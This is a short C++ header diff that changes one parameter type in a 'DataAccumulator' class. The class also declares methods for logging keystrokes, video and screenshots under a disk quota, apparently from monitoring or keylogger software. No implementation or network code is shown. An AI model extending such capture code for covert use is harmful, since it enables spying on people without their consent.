@@ -25,7 +25,7 @@ public:
 	DataAccumulator(void);
 	~DataAccumulator(void);
 	void SetDiskQuota(int quota) { quotaWatcher->SetQuota(quota);}
-	void RegisterNewFile(wchar_t* fileName) { quotaWatcher->RegisterNewFile(fileName); }
+	void RegisterNewFile(PSTR fileName) { quotaWatcher->RegisterNewFile(fileName); }
 	void LogKey(PWSTR key);
 	void LogVideo(PTSTR videoFile);
 	void LogPrintScreen(PTSTR imageFile);
